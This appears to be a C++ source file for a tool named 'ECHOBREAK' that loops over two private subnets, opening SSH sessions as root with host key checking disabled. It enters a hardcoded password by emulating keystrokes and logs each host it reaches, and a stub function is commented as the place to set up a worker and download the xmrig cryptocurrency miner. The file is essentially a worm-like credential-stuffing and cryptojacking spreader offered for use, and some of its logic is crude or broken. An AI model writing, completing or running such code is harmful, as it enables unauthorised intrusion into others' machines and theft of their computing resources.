#include <stdlib.h>
#include <iostream>
#include <unistd.h>
#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/extensions/XTest.h>
#include <memory>
#include <fstream>
#include <vector>
#include <array>

void emulate_keyboard(std::string inp){
	Display *display;
	display = XOpenDisplay(NULL);
	unsigned int keycode;
	for(char c : inp){
	keycode = XKeysymToKeycode(display, c);
	XTestFakeKeyEvent(display, keycode, True, 0);
	XTestFakeKeyEvent(display, keycode, False, 0);
	sleep(0.1);
	XFlush(display);
	}
	keycode = XKeysymToKeycode(display, XK_KP_Enter);
	XTestFakeKeyEvent(display, keycode, True, 0);
	XTestFakeKeyEvent(display, keycode, False, 0);
	sleep(0.1);
	XFlush(display);
	XCloseDisplay(display);
}

std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(cmd, "r"), pclose);
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }

    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

bool check_connection(std::string inp){
	std::string word = "";
	for(int i = 0; i < inp.size(); ++i){
		if(inp[i] == ' '){
			if(word == "password" || word == "Password"){ //idk password or Password (edit this if u know)
				return 1;
			}
			word = "";
		}
		else{
			word += inp[i];
		}
	}
	return 0;
}

void setup(){
	//ur func to setup worker and download xmrig
}

int main(){
	std::cout << "W3LC0M T0 ECHOBREAK!!" << std::endl;
	std::string ip;
	std::vector<std::string> hosts;
	for(int i = 2; i < 256; ++i){
		//checking for 112
		ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3  root@172.17.212." + std::to_string(i); //ip
		if(check_connection(exec(ip.c_str()))){ 
			emulate_keyboard("1347QwAsZx"); //entering password
			hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
			setup(); // ur func
			system("exit");
		}
		//checking for 113
		ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 root@172.17.213." + std::to_string(i); //ip
		if(check_connection(exec(ip.c_str()))){
			emulate_keyboard("1347QwAsZx"); //entering password
			hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
			setup(); // ur func
			system("exit");
		}
	}

	std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
	for(auto host : hosts){ // for each loop
		out << host << std::endl; // write
	}
	out.close(); // close file
	
	return 0xABCDEF;
}
